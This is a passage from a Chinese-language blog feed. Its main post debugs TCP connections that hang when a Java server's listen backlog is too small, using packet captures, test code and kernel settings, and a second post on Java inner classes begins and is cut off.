      <category term="内存可见性" scheme="https://h-zex.github.io/tags/%E5%86%85%E5%AD%98%E5%8F%AF%E8%A7%81%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>高并发情况下backlog过低出现的问题</title>
    <link href="https://h-zex.github.io/2019/03/19/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%83%85%E5%86%B5%E4%B8%8Bbacklog%E8%BF%87%E4%BD%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://h-zex.github.io/2019/03/19/高并发情况下backlog过低出现的问题/</id>
    <published>2019-03-19T13:58:41.000Z</published>
    <updated>2019-07-02T15:43:52.461Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经<code>new Socket()</code>成功（根据测试，这意味着三次握手完成），但是就是收不到welcome信息，服务端的log看到的accept的链接数目少于client打开的链接数目(服务端的accept也没有报错)，少的数量刚好是client端hang住在读welcome信息那些链接的数目。后来尝试了调整<code>ulimit</code>无果，调整了backlog后就好了。看起来就像是一些链接被悄无声息（没有返回FIN或RST之类的报文）地从 等待被应用accept的队列 移除。</li><li>我抽查的十几个hang住的端口对应的报文都是三次握手成功，然后还hang住时是没有新的报文的，client一关闭，发送了FIN后，一种情况是，server端就发送数据给client，另一种情况是server端对client的FIN报文返回RST。</li><li><p>报文如下</p><ul><li><p>第一种情况的报文，这种是client hang住没多久就关掉整个client进程时出现的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 117890 271.658989117  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40900 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647083 TSecr=0 WS=128</span><br><span class="line"> 201498 272.673187012  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 40900 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=0 WS=128</span><br><span class="line"> 201591 272.673232077  127.0.0.1             127.0.0.1             TCP      74     8083 → 40900 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648068 TSecr=298648097 WS=128</span><br><span class="line"> 201643 272.673288084  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298648068</span><br><span class="line"> 203783 297.152188039  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298672576 TSecr=298648068</span><br><span class="line"> 203823 297.152451323  127.0.0.1             127.0.0.1             TCP      73     8083 → 40900 [PSH, ACK] Seq=1 Ack=2 Win=29312 Len=7 TSval=298672576 TSecr=298672576</span><br><span class="line">0000  68 65 6c 6c 6f 0d 0a                              hello..</span><br><span class="line"> 203825 297.152464118  127.0.0.1             127.0.0.1             TCP      54     40900 → 8083 [RST] Seq=2 Win=0 Len=0</span><br></pre></td></tr></table></figure></li><li><p>第二种情况的报文，这种是client hang住很久才关掉整个client进程时出现的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 21004 108.400081512  127.0.0.1             127.0.0.1             TCP      74     46538 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298483826 TSecr=0 WS=128</span><br><span class="line"> 92060 109.409186851  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 46538 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484836 TSecr=0 WS=128</span><br><span class="line"> 92108 109.409228584  127.0.0.1             127.0.0.1             TCP      74     8083 → 46538 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484804 TSecr=298484836 WS=128</span><br><span class="line"> 92155 109.409268850  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298484836 TSecr=298484804</span><br><span class="line">112908 254.340209126  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298629764 TSecr=298484804</span><br><span class="line">112909 254.340214301  127.0.0.1             127.0.0.1             TCP      54     8083 → 46538 [RST] Seq=1 Win=0 Len=0</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul><li><p>server</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBacklogServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Executor executor = Executors.newFixedThreadPool(<span class="number">128</span>);</span><br><span class="line">        ServerSocket socket = <span class="keyword">new</span> ServerSocket(<span class="number">8083</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> Socket client = socket.accept();</span><br><span class="line">            System.out.println(cnt + <span class="string">": accept one: "</span> + client.getRemoteSocketAddress());</span><br><span class="line">            cnt++;</span><br><span class="line">            executor.execute(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    client.getOutputStream().write(<span class="string">"hello\r\n"</span>.getBytes());</span><br><span class="line">                    client.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>client。之所以设置了timeout，是为了拿到hang住的端口号，测试时可以不设置timeout，然后在没有新的输出时，threadDump，可以看到有多个链接hang在read那里</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketTimeoutException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.LongAdder;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBacklogClient</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LongAdder adder = <span class="keyword">new</span> LongAdder();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        Vector&lt;Integer&gt; timeoutPorts = <span class="keyword">new</span> Vector&lt;&gt;(<span class="number">1240</span>);</span><br><span class="line">        ExecutorService pool = Executors.newFixedThreadPool(<span class="number">128</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10240</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> finalI = i;</span><br><span class="line">            pool.execute(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Socket socket = <span class="keyword">new</span> Socket(<span class="string">"localhost"</span>, <span class="number">8083</span>);</span><br><span class="line">                    socket.setSoTimeout(<span class="number">1024</span> * <span class="number">10</span>);</span><br><span class="line">                    System.out.println(<span class="string">"connect Success one: "</span> + finalI);</span><br><span class="line">                    String r = readLine(socket.getInputStream());</span><br><span class="line">                    <span class="keyword">assert</span> r == <span class="keyword">null</span> || <span class="string">"hello\r\n"</span>.equals(r);</span><br><span class="line">                    <span class="keyword">if</span> (r == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        timeoutPorts.add(socket.getLocalPort());</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">"read success one: "</span> + finalI);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        pool.shutdown();</span><br><span class="line">        pool.awaitTermination(<span class="number">1024</span>, TimeUnit.DAYS);</span><br><span class="line">        System.out.println(adder.sum());</span><br><span class="line">        System.out.println(timeoutPorts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">readLine</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> t = in.read(buf);</span><br><span class="line">                <span class="keyword">if</span> (t &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                builder.append(<span class="keyword">new</span> String(buf, <span class="number">0</span>, t));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> builder.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SocketTimeoutException ex) &#123;</span><br><span class="line">            adder.add(<span class="number">1</span>);</span><br><span class="line">            System.out.println(<span class="string">"time out, read: "</span> + builder.length()</span><br><span class="line">                    + <span class="string">", "</span> + builder.toString()</span><br><span class="line">                    + <span class="string">", hasCRLF: "</span> + (builder.lastIndexOf(<span class="string">"\r\n"</span>) &gt;= <span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>localhost的系统配置信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r</span><br><span class="line">4.18.0-13-generic</span><br><span class="line"></span><br><span class="line">$ /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class="line">512</span><br><span class="line"></span><br><span class="line">$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 18.10</span><br><span class="line">Release:18.10</span><br><span class="line">Codename:cosmic</span><br><span class="line"></span><br><span class="line">$ java -version                  </span><br><span class="line">openjdk version &quot;11.0.1&quot; 2018-10-16</span><br><span class="line">OpenJDK Runtime Environment 18.9 (build 11.0.1+13)</span><br><span class="line">OpenJDK 64-Bit Server VM 18.9 (build 11.0.1+13, mixed mode)</span><br><span class="line"></span><br><span class="line">$ /bin/cat /proc/sys/net/core/somaxconn    </span><br><span class="line">128</span><br></pre></td></tr></table></figure></li><li><p>vps的配置信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# ./jdk-11.0.2/bin/java -version</span><br><span class="line">java version &quot;11.0.2&quot; 2019-01-15 LTS</span><br><span class="line">Java(TM) SE Runtime Environment 18.9 (build 11.0.2+9-LTS)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.2+9-LTS, mixed mode)</span><br><span class="line"></span><br><span class="line">root@vultr:~# uname -r</span><br><span class="line">4.18.0-10-generic</span><br><span class="line"></span><br><span class="line">root@vultr:~# lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.10</span><br><span class="line">Release:        18.10</span><br><span class="line">Codename:       cosmic</span><br><span class="line"></span><br><span class="line">root@vultr:~# /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class="line">128</span><br><span class="line"></span><br><span class="line">root@vultr:~# /bin/cat /proc/sys/net/core/somaxconn</span><br><span class="line">128</span><br></pre></td></tr></table></figure></li><li><p>复现过程出现过这个现象：client端<code>ctrl-c</code>关掉后，server端突然就接收到了剩下的所有链接。这个在server运行在localhost时并且 一旦所有其他没有被hang住的链接完成后马上就<code>ctrl-c</code>时出现过，但是在server运行在vps上没出现过。</p></li></ul><h3 id="猜测原因一"><a href="#猜测原因一" class="headerlink" title="猜测原因一"></a>猜测原因一</h3><ul><li><p>按照TCP/IP详解卷二的说法，如果listen的那个端点的队列满了（已经完成三次握手的队列，其大小由backlog确定），那么就不回复syn。但是，有个问题，如果多个syn同时到达，那么即使这时候队列未满，也可能接受了这些syn的一部分后队列就满了，那么linux系统如何处理——是否会存在有些链接三次握手完成，但是放不进队列里。</p></li><li><p>按照这篇文章(<a href="http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html" target="_blank" rel="noopener">http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html</a>)的说法，如果遇到这种情况，服务器会不断发送<code>syn/ack</code>报文（如果<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>是<code>1</code>，则发送RST）</p></li><li><p>我自己也抓到了这种报文，其中8083是server，server的backlog只有10，然后有10240个client企图链接该server。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line"> 117974 271.659812650  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40970 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=0 WS=128</span><br><span class="line"> 117976 271.659818367  127.0.0.1             127.0.0.1             TCP      74     8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=298647084 WS=128</span><br><span class="line"> 117977 271.659825016  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298647084 TSecr=298647084</span><br><span class="line"> 201482 272.673178662  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=298647084 WS=128</span><br><span class="line"> 201563 272.673220860  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#1] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298647084</span><br><span class="line"> 201993 274.693205982  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298650117 TSecr=298648097 WS=128</span><br><span class="line"> 201995 274.693247830  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#2] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298650117 TSecr=298647084</span><br><span class="line"> 201997 274.693527487  127.0.0.1             127.0.0.1             TCP      73     8083 → 40970 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=298650117 TSecr=298650117</span><br><span class="line">0000  68 65 6c 6c 6f 0d 0a                              hello..</span><br><span class="line"> 201999 274.693556287  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=298650117 TSecr=298650117</span><br><span class="line"> 202001 274.695599421  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=298650119 TSecr=298650117</span><br><span class="line"> 202009 274.737168658  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298650161 TSecr=298650119</span><br><span class="line"> 203731 297.151676910  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [FIN, ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298672575 TSecr=298650119</span><br><span class="line"> 203732 297.151682855  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [ACK] Seq=9 Ack=2 Win=43776 Len=0 TSval=298672575 TSecr=298672575</span><br></pre></td></tr></table></figure><p> 在<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>设为<code>1</code>之后，抓到了如下报文。需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">   5904 9.174057671    127.0.0.1             127.0.0.1             TCP      74     54448 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300065429 TSecr=0 WS=128</span><br><span class="line">  92075 10.190560916   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300066446 TSecr=0 WS=128</span><br><span class="line">  92209 12.206628025   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=0 WS=128</span><br><span class="line">  92258 12.206814283   127.0.0.1             127.0.0.1             TCP      74     8083 → 54448 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=300068462 WS=128</span><br><span class="line">  92319 12.207072233   127.0.0.1             127.0.0.1             TCP      66     54448 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=300068462 TSecr=300068462</span><br><span class="line">  92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0</span><br></pre></td></tr></table></figure><p> 需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文——如下面所示，最后的那个No.为<code>92345</code>后面还有很多报文，都是8083端口的server与client的通信</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">  92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0</span><br><span class="line">  92346 12.207985091   127.0.0.1             127.0.0.1             TCP      73     8083 → 54168 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462</span><br><span class="line">  92347 12.208004676   127.0.0.1             127.0.0.1             TCP      66     54168 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=300068463 TSecr=300068463</span><br><span class="line">  92348 12.208041224   127.0.0.1             127.0.0.1             TCP      66     8083 → 54168 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=300068463 TSecr=300068463</span><br><span class="line">  92349 12.208052138   127.0.0.1             127.0.0.1             TCP      73     8083 → 54172 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462</span><br></pre></td></tr></table></figure></li><li><p>然而，这个并不是上述问题的原因，因为打印出来的hang住的端口号，跟发生重传<code>syn/ack</code>的端口号对不上</p></li></ul><h3 id="猜测原因二"><a href="#猜测原因二" class="headerlink" title="猜测原因二"></a>猜测原因二</h3><ul><li>网上搜到这篇文章<a href="http://www.10tiao.com/html/749/201411/201005717/1.html" target="_blank" rel="noopener">http://www.10tiao.com/html/749/201411/201005717/1.html</a></li><li>案例分析（二）那里描述的现象刚好跟跟上述问题非常相似——也是client握手成功但是读不到信息，作者分析的原因是，第三次握手的ACK因为AcceptQueue溢出而被丢弃，导致client进入了ESTABLISHED状态，但是server只是在<code>SYN_RECV</code>状态，并且因为<code>net.ipv4.tcp_synack_retries=1</code>(我的测试机器的这个参数是5)，所以如果Server重传的SYN+ACK报文对应的ACK还是被丢弃，那么就会进入client以为连接成功，但是server并没有连接成功的状态</li><li>然而，我把server架设到另一个机子上，然后使用<code>watch -n 0.5 &quot;netcat -n | grep 8083 | grep -i &quot;syn&quot;&quot;</code>检查server那里是否有链接是一直处于<code>syn_recv</code>状态，但是整个过程中看到的处于<code>SYN_RECV</code>状态的链接端口号都是在不断变动（说明它们不是hang住的链接），并且client端所有没有hang住的链接都完成后，只剩下hang住的链接时，server端是看不到处于<code>syn_recv</code>状态的链接的</li><li>所以我认为可能也不是这个原因（欢迎指正！）</li></ul><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><ul><li>这个问题并没有解决，如果有大佬知道原因，或者有一些想法，欢迎与我交流，谢谢！</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经&lt;code&gt;
      
    
    </summary>
    
      <category term="网络编程" scheme="https://h-zex.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="高并发" scheme="https://h-zex.github.io/tags/%E9%AB%98%E5%B9%B6%E5%8F%91/"/>
    
      <category term="backlog" scheme="https://h-zex.github.io/tags/backlog/"/>
    
      <category term="TCP" scheme="https://h-zex.github.io/tags/TCP/"/>
    
  </entry>
  
  <entry>
    <title>Java内部类、局部类的实现原理以及与内存可见性的关系</title>
    <link href="https://h-zex.github.io/2019/03/04/java%E5%86%85%E9%83%A8%E7%B1%BB%E3%80%81%E5%B1%80%E9%83%A8%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <id>https://h-zex.github.io/2019/03/04/java内部类、局部类的实现原理/</id>
    <published>2019-03-04T12:54:01.000Z</published>
    <updated>2019-07-02T15:43:52.429Z</updated>
    
    <content type="html"><![CDATA[<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><blockquote><p>以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/java11的javac和fernflower这个反编译器反编译字节码得到的<br>以下内容不确实是openjdk javac特有的实现，还是规范这样要求</p></blockquote><ul><li><p>对象内总有一个隐式引用， 它指向了创建它的外部类对象，比如下面的反编译代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">JavaLangTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">      JavaLangTest.InnerClass var1 = <span class="keyword">new</span> JavaLangTest.InnerClass(<span class="keyword">new</span> JavaLangTest());</span><br><span class="line">      System.out.println(var1);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavaLangTest</span>$<span class="title">InnerClass</span> </span>&#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> JavaLangTest <span class="keyword">this</span>$<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> 